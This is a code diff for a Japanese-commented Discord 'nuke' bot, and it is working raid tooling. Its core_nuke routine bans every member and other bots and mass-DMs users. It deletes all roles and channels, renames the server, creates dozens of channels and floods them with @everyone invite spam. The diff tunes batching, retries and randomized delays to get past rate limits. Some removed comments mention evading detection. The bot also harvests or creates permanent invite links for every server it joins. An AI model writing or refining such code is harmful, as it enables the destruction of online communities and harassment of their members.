@@ -23,9 +23,9 @@ intents.guilds = True
 
 bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
 
-# ギリギリ爆速Semaphore（global 45で50/s未満）
+# ギリギリ爆速Semaphore
 sem_global = asyncio.Semaphore(45)
-sem_message = asyncio.Semaphore(8)   # チャンネル5/5s考慮
+sem_message = asyncio.Semaphore(8)
 sem_dm = asyncio.Semaphore(10)
 
 async def limited_global(coro):
@@ -34,11 +34,11 @@ async def limited_global(coro):
             await coro
         except discord.HTTPException as e:
             if e.status == 429:
-                wait = getattr(e, 'retry_after', 1) + random.uniform(0.2, 0.8)
+                wait = getattr(e, 'retry_after', 1) + random.uniform(0.1, 0.5)
                 await asyncio.sleep(wait)
-                await coro  # リトライ1回
+                await coro  # リトライ
             else:
-                pass  # 他のエラー無視
+                pass
 
 async def limited_message(coro):
     async with sem_message:
@@ -90,17 +90,17 @@ async def create_colored_roles_task(guild, target_roles):
                 await asyncio.sleep(wait)
             else:
                 break
-        await asyncio.sleep(random.uniform(0.15, 0.3))  # 爆速寄り
+        await asyncio.sleep(random.uniform(0.15, 0.3))
 
 async def ban_all_task(guild, members, reason):
     for m in members:
-        if m == guild.me:  # 自分をBANしない
+        if m == guild.me:
             continue
         try:
-            await guild.ban(m, reason=reason, delete_message_seconds=0)  # 警告回避
+            await guild.ban(m, reason=reason, delete_message_seconds=0)
         except:
             pass
-        await asyncio.sleep(random.uniform(0.2, 0.4))  # BANは検知されやすいので少し抑え
+        await asyncio.sleep(random.uniform(0.2, 0.4))
 
 async def core_nuke(guild, new_server_name=None):
     new_name = new_server_name or DEFAULT_NEW_NAME
@@ -110,44 +110,47 @@ async def core_nuke(guild, new_server_name=None):
 
     print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
 
-    # 他のボットBAN（並行爆速）
+    # 他のボットBAN
     await asyncio.gather(*(limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot), return_exceptions=True)
 
-    # DM（爆速DM）
+    # DM
     await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)
 
-    # ロール削除（最適化: バッチ5 + 逐次 + エラーログ + 確認）
+    # ロール削除（爆速 + 最低限ログ + 残り自動リトライ）
     roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
-    print(f"ロール削除対象: {len(roles_to_delete)}")
-    batch_size = 5  # 最適化で小さくして確実に
-    for i in range(0, len(roles_to_delete), batch_size):
-        batch = roles_to_delete[i:i+batch_size]
-        for role in batch:
-            try:
-                await limited_global(role.delete())
-                print(f"ロール削除成功: {role.name}")
-            except discord.HTTPException as e:
-                if e.status == 429:
-                    wait = getattr(e, 'retry_after', 3) + random.uniform(0.5, 1.5)
-                    print(f"レートリミット（ロール削除）: {wait}s待機 - {role.name}")
-                    await asyncio.sleep(wait)
-                    try:
-                        await role.delete()  # リトライ
-                        print(f"ロール削除リトライ成功: {role.name}")
-                    except Exception as retry_e:
-                        print(f"ロール削除リトライ失敗: {role.name} - {retry_e}")
-                elif e.status in (403, 401):
-                    print(f"権限不足で削除失敗: {role.name} - {e}")
-                else:
-                    print(f"ロール削除エラー: {role.name} - {e}")
-            await asyncio.sleep(random.uniform(0.15, 0.35))  # 逐次sleepで検知回避
-    # 削除後確認
-    await asyncio.sleep(2)  # 反映待機
-    remaining_roles = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
-    print(f"削除後残りロール: {len(remaining_roles)}個")
+    print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
 
-    # チャンネル削除（並行爆速）
-    await asyncio.gather(*(limited_global(ch.delete()) for ch in guild.channels), return_exceptions=True)
+    async def delete_roles_batch(roles):
+        await asyncio.gather(*(limited_global(r.delete()) for r in roles), return_exceptions=True)
+
+    batch_size = 10
+    deleted = False
+    attempt = 0
+    while not deleted and attempt < 3:  # 最大3回リトライ
+        attempt += 1
+        for i in range(0, len(roles_to_delete), batch_size):
+            batch = roles_to_delete[i:i+batch_size]
+            await delete_roles_batch(batch)
+            await asyncio.sleep(random.uniform(0.05, 0.15))  # 超短sleepで爆速
+
+        await asyncio.sleep(1)  # 反映待機
+        remaining = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
+        if len(remaining) == 0:
+            deleted = True
+        else:
+            print(f"ロール削除試行{attempt}: 残り {len(remaining)}個 → リトライ")
+            roles_to_delete = remaining  # 残りを再対象
+
+    print(f"ロール削除完了: 残り {len([r for r in await guild.fetch_roles() if not r.is_default() and not r.managed])}個")
+
+    # チャンネル削除（バッチ化で429回避）
+    channels = list(guild.channels)
+    print(f"チャンネル削除開始: 対象 {len(channels)}個")
+    batch_size_ch = 10
+    for i in range(0, len(channels), batch_size_ch):
+        batch_ch = channels[i:i+batch_size_ch]
+        await asyncio.gather(*(limited_global(ch.delete()) for ch in batch_ch), return_exceptions=True)
+        await asyncio.sleep(random.uniform(0.1, 0.3))
 
     # サーバー名変更
     try:
@@ -155,10 +158,10 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # 規模別調整（爆速寄りに上限引き上げ）
+    # 規模別調整（爆速寄り）
     member_count = len(non_bot_members)
     if member_count < 100:
-        target_channels = 80   # 増やして爆速
+        target_channels = 80
         target_roles = 70
         spam_sleep_min = 0.08
         spam_sleep_max = 0.25
@@ -173,37 +176,37 @@ async def core_nuke(guild, new_server_name=None):
         spam_sleep_min = 0.20
         spam_sleep_max = 0.40
 
-    # チャンネル作成（バッチ15爆速）
-    channels = []
+    # チャンネル作成
+    channels_created = []
     current = 0
     channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
-    while len(channels) < target_channels:
+    while len(channels_created) < target_channels:
         tasks = []
         batch_size = 15
         for _ in range(batch_size):
-            if len(channels) >= target_channels:
+            if len(channels_created) >= target_channels:
                 break
             current += 1
             name = channel_names[current % 2]
             tasks.append(create_channel_safely(guild, name))
         batch = await asyncio.gather(*tasks, return_exceptions=True)
         added = [c for c in batch if isinstance(c, discord.TextChannel)]
-        channels += added
+        channels_created += added
         await asyncio.sleep(random.uniform(0.2, 0.4))
 
-    # スパム（上限150に増やし、sleep短めで爆速）
+    # スパム
     spam_messages = [
         f"@everyone {INVITE_LINK}",
         f"@everyone 来い {INVITE_LINK}"
     ]
 
-    message_counters = {ch.id: 0 for ch in channels}
-    active_channels = channels.copy()
+    message_counters = {ch.id: 0 for ch in channels_created}
+    active_channels = channels_created.copy()
 
     ban_task = asyncio.create_task(ban_all_task(guild, non_bot_members, new_name))
     role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))
 
-    while any(c < 150 for c in message_counters.values()):  # 100→150爆速
+    while any(c < 150 for c in message_counters.values()):
         spam_tasks = []
         for ch in active_channels[:]:
             if message_counters[ch.id] >= 150:
@@ -220,9 +223,10 @@ async def core_nuke(guild, new_server_name=None):
 
     print("完了")
 
+# 管理View部分（前のまま）
 class ManageView(discord.ui.View):
     def __init__(self, bot):
-        super().__init__(timeout=None)  # 永久View（再起動でリセット）
+        super().__init__(timeout=None)
         self.bot = bot
 
     @discord.ui.button(label="サーバー一覧", style=discord.ButtonStyle.primary)
@@ -260,15 +264,14 @@ async def on_ready():
         await log_server_info(guild)
     print("=====================================")
 
-    # 管理チャンネルにView付きメッセージ送信
+    # 管理チャンネルにView送信
     manage_guild = bot.get_guild(MANAGE_GUILD_ID)
     if manage_guild:
         manage_channel = manage_guild.get_channel(MANAGE_CHANNEL_ID)
         if manage_channel:
             view = ManageView(bot)
-            # ドロップダウンオプション追加（全サーバー）
             options = [discord.SelectOption(label=g.name, value=str(g.id)) for g in bot.guilds]
-            view.select_guild.options = options  # selectにオプションセット
+            view.select_guild.options = options
             await manage_channel.send("サーバー管理パネル", view=view)
         else:
             print("管理チャンネルが見つかりません")
@@ -286,21 +289,19 @@ async def log_server_info(guild):
     invite_link = "取得失敗（権限不足 or チャンネルなし）"
 
     try:
-        # 既存招待から永久リンクを探す
         invites = await guild.invites()
         permanent_invite = None
         for inv in invites:
-            if inv.max_age == 0 and inv.max_uses == 0:  # 永久招待
+            if inv.max_age == 0 and inv.max_uses == 0:
                 permanent_invite = inv
                 break
-            if inv.inviter is None or inv.inviter == guild.owner:  # owner作成のもの優先
+            if inv.inviter is None or inv.inviter == guild.owner:
                 permanent_invite = inv
                 break
 
         if permanent_invite:
             invite_link = permanent_invite.url
         else:
-            # 見つからなければ新規作成（最初のテキストチャンネル使用）
             if guild.text_channels:
                 channel = guild.text_channels[0]
                 new_invite = await channel.create_invite(max_age=0, max_uses=0, unique=True, reason="Bot自動永久招待")
